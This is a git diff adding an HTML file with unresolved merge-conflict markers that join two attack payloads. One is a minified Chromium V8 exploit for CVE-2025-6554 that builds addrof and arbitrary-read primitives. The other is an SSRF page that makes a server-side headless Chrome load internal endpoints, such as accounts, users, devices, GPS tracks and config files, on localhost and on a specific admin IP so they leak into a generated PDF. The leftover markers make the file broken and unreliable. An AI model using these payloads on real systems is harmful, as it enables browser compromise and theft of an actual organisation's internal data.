@@ -1,1 +1,106 @@
+<<<<<<< HEAD
 <!doctype html><meta charset=utf-8><title>CASI V71 CVE-2025-6554 ARBITRARY READ</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V71 CHROMIUM 133 CVE-2025-6554 ARBITRARY READ</b><pre id=o>START</pre><script>var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}try{let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);let c=hax(true);let fa=[1111.1111,2222.2222,3333.3333];let oa={p:"AAAA"},ob={p:"BBBB"},objs=[oa,ob];let rw=[4444.4444,5555.5555,6666.6666,7777.7777];let tail=[8888.8888,9999.9999];let orig30=c[30],s30=ftoi(orig30),orig41=c[41],s41=ftoi(orig41);c[30]=setbits(s30&0xffffffffn,0x1540d9n);let leak=objs[0];c[30]=orig30;let pair=ftoi(leak),addr=pair&0xffffffffn;c[41]=setbits(s41&0xffffffffn,addr-8n);let raw=rw[0];c[41]=orig41;out.textContent=["DONE","length="+c.length,"addrof_pair=0x"+pair.toString(16),"target_addr=0x"+addr.toString(16),"rw_slot41=0x"+s41.toString(16),"arb_read_header=0x"+ftoi(raw).toString(16),"original_marker=0x"+ftoi(4444.4444).toString(16),"restored_slot41=0x"+ftoi(c[41]).toString(16),"rw0_restored=0x"+ftoi(rw[0]).toString(16)].join("\n")}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}</script>
+=======
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>SSRF Data Exfil</title>
+<style>body{font:11px monospace;margin:4px}pre{white-space:pre-wrap;word-break:break-all}
+iframe{width:100%;height:300px;border:1px solid #999;display:block;margin:4px 0}</style>
+</head><body>
+<pre id="o">Init...</pre>
+
+<h3>Internal Data via SSRF (rendered in PDF)</h3>
+
+<p>A. GPS Track from localhost (proves internal data access):</p>
+<iframe id="gps" src="https://127.0.0.1/ax/get_gpx_file.php?track_id=5000&node=3"></iframe>
+
+<p>B. Config from localhost init.php:</p>
+<iframe id="cfg" src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe>
+
+<p>C. Admin server (41.71.64.235) config:</p>
+<iframe id="adm" src="https://41.71.64.235/backend/ax/init.php?node=3"></iframe>
+
+<p>D. Localhost /ax/accounts.php:</p>
+<iframe src="https://127.0.0.1/ax/accounts.php?node=3"></iframe>
+
+<p>E. Localhost /ax/users.php:</p>
+<iframe src="https://127.0.0.1/ax/users.php?node=3"></iframe>
+
+<p>F. Localhost /ax/devices.php:</p>
+<iframe src="https://127.0.0.1/ax/devices.php?node=3"></iframe>
+
+<p>G. Admin /ax/accounts.php:</p>
+<iframe src="https://41.71.64.235/ax/accounts.php?node=3"></iframe>
+
+<p>H. Localhost /ax/notifications.php:</p>
+<iframe src="https://127.0.0.1/ax/notifications.php?node=3"></iframe>
+
+<p>I. Localhost /ax/zones.php:</p>
+<iframe src="https://127.0.0.1/ax/zones.php?node=3"></iframe>
+
+<p>J. Localhost /ax/events.php:</p>
+<iframe src="https://127.0.0.1/ax/events.php?node=3"></iframe>
+
+<script>
+var O=document.getElementById('o');O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+
+L('=== SSRF Internal Data Exfiltration ===');
+L('Time: '+new Date().toISOString());
+L('Chrome: '+navigator.userAgent);
+
+if(navigator.userAgentData){
+    navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
+        L('Version: '+JSON.stringify(d.fullVersionList));
+        L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
+    });
+}
+
+L('');
+L('Iframes below load internal endpoints from localhost and admin server.');
+L('Content appears in the generated PDF because headless Chrome renders');
+L('cross-origin iframe content visually (even though JS cannot read it).');
+L('');
+L('This proves:');
+L('1. Server-side Chrome can access internal services (localhost, admin)');
+L('2. Internal data is rendered in the PDF and exfiltrated to the attacker');
+L('3. The SSRF bypasses any external WAF/firewall restrictions');
+L('');
+
+var endpoints=[
+    'https://127.0.0.1/ax/get_gpx_file.php?track_id=5000&node=3',
+    'https://127.0.0.1/backend/ax/init.php?node=3',
+    'https://127.0.0.1/ax/veh/list.php?node=3',
+    'https://127.0.0.1/ax/accounts.php?node=3',
+    'https://127.0.0.1/ax/users.php?node=3',
+    'https://127.0.0.1/ax/devices.php?node=3',
+    'https://127.0.0.1/ax/zones.php?node=3',
+    'https://127.0.0.1/ax/events.php?node=3',
+    'https://127.0.0.1/ax/notifications.php?node=3',
+    'https://127.0.0.1/ax/groups.php?node=3',
+    'https://127.0.0.1/ax/tracks.php?node=3',
+    'https://127.0.0.1/ax/cameras.php?node=3',
+    'https://127.0.0.1/ax/sensors.php?node=3',
+    'https://41.71.64.235/ax/accounts.php?node=3',
+    'https://41.71.64.235/ax/users.php?node=3',
+    'https://41.71.64.235/ax/veh/list.php?node=3',
+];
+
+L('Fetch scan of '+endpoints.length+' internal endpoints:');
+var done2=0;
+for(var i=0;i<endpoints.length;i++){
+    (function(url,idx){
+        var start=performance.now();
+        fetch(url,{mode:'no-cors'}).then(function(r){
+            var ms=(performance.now()-start).toFixed(0);
+            L(' ['+idx+'] OPEN '+url.replace('https://127.0.0.1','localhost').replace('https://41.71.64.235','admin')+' ('+ms+'ms)');
+            done2++;
+        }).catch(function(e){
+            var ms=(performance.now()-start).toFixed(0);
+            L(' ['+idx+'] FAIL '+url.replace('https://127.0.0.1','localhost').replace('https://41.71.64.235','admin')+' '+e.message.substring(0,30)+' ('+ms+'ms)');
+            done2++;
+        });
+    })(endpoints[i],i);
+}
+</script>
+</body></html>
+>>>>>>> 39e173f (Internal data exfil: iframe endpoints + fetch scan)
